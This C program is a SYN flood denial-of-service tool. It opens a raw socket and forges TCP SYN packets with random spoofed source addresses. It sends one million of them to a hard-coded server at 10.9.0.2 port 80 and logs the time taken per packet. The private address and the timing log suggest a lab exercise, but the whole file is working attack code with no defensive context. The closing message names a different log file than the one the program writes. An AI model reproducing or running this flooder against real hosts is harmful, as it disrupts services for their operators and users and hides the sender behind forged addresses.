#define _GNU_SOURCE // for clock_gettime
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>

#define SOURCE_PORT 12345
#define MASK 256
#define PACKET_SIZE 1 << 12
#define SERVER_IP "10.9.0.2"
#define SERVER_PORT 80
#define BUFFER_SIZE 1024
#define NUM_OF_TRIES 10000
#define NUM_OF_ITERATIONS 100

struct pseudo_header
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
};

unsigned short checksum(void *b, int len)
{
    unsigned short *buf = (unsigned short *)b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

int main()
{
    int sock;
    int mask1, mask2, mask3, mask4;
     FILE *log_file;
     struct timespec start, end;
    double time_taken;
    long total_packets = 0; 
    double total_time = 0.0;

    // Open log file
    log_file = fopen("syn_flood_log.txt", "w");
    if (log_file == NULL)
    {
        printf("Error opening file!\n");
        exit(1);
    }

    // Create a socket
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0)
    {
        perror("Socket creation failed");
        fclose(log_file);
        exit(EXIT_FAILURE);
    }

    int opt = 1;
    // IP_HDRINCL to tell the kernel that headers are included in the packet
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) < 0)
    {
        perror("Setsockopt failed");
        close(sock);
        fclose(log_file);
        return 1;
    }

    // Create buffer for the packet
    char packet[PACKET_SIZE];
    memset(packet, 0, PACKET_SIZE);

    // Fill in the IP Header
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct pseudo_header psh;

    printf("Sending SYN flood to %s:%d\n", SERVER_IP, SERVER_PORT);

    for (size_t j = 0; j < NUM_OF_ITERATIONS; j++)
    {
        for (size_t i = 0; i < NUM_OF_TRIES; i++)
        {
            clock_gettime(CLOCK_MONOTONIC, &start);
            mask1 = rand() % MASK;
            mask2 = rand() % MASK; 
            mask3 = rand() % MASK;
            mask4 = rand() % MASK;
            char src_ip[16];
            snprintf(src_ip, sizeof(src_ip), "%d.%d.%d.%d", mask1, mask2, mask3, mask4);
            
            // Fill in the IP Header
            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
            iph->id = htonl(54321); // Id of this packet
            iph->frag_off = 0;
            iph->ttl = 255;
            iph->protocol = IPPROTO_TCP;
            iph->check = 0;                    // Set to 0 before calculating checksum
            iph->saddr = inet_addr(src_ip);    // Source IP
            iph->daddr = inet_addr(SERVER_IP); // Destination IP

            iph->check = checksum((unsigned short *)packet, iph->tot_len);

            // TCP Header
            tcph->source = htons(SOURCE_PORT);
            tcph->dest = htons(SERVER_PORT);
            tcph->seq = 0;
            tcph->ack_seq = 0;
            tcph->doff = 5; // tcp header size
            tcph->fin = 0;
            tcph->syn = 1;
            tcph->rst = 0;
            tcph->psh = 0;
            tcph->ack = 0;
            tcph->urg = 0;
            tcph->window = htons(5840); /* maximum allowed window size */
            tcph->check = 0;            // leave checksum 0 now, filled later by pseudo header
            tcph->urg_ptr = 0;

            // Now the TCP checksum
            psh.source_address = inet_addr(src_ip);
            psh.dest_address = inet_addr(SERVER_IP);
            psh.placeholder = 0;
            psh.protocol = IPPROTO_TCP;
            psh.tcp_length = htons(sizeof(struct tcphdr));

            int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
            char *pseudogram = (char *)malloc(psize);

            memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
            memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));

            tcph->check = checksum((unsigned short *)pseudogram, psize);

            // Send the packet
            struct sockaddr_in dest;
            dest.sin_family = AF_INET;
            dest.sin_port = htons(SERVER_PORT);
            dest.sin_addr.s_addr = inet_addr(SERVER_IP);

            if (sendto(sock, packet, iph->tot_len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0)
            {
                perror("Send failed");
            }
              clock_gettime(CLOCK_MONOTONIC, &end);

            time_taken = (end.tv_sec - start.tv_sec) * 1e9;
            time_taken = (time_taken + (end.tv_nsec - start.tv_nsec)) * 1e-9;

            total_packets++;
            total_time += time_taken;

            fprintf(log_file, "%ld %.9f\n", total_packets, time_taken);
            free(pseudogram);
        }
    }
 double avg_time = total_time / total_packets;
    fprintf(log_file, "Total packets sent: %ld\n", total_packets);
    fprintf(log_file, "Total time taken: %.9f seconds\n", total_time);
    fprintf(log_file, "Average time per packet: %.9f seconds\n", avg_time);

    close(sock);
    fclose(log_file);
    printf("\nConnection closed. Results logged to syns_results_c.txt\n");
    return 0;
}
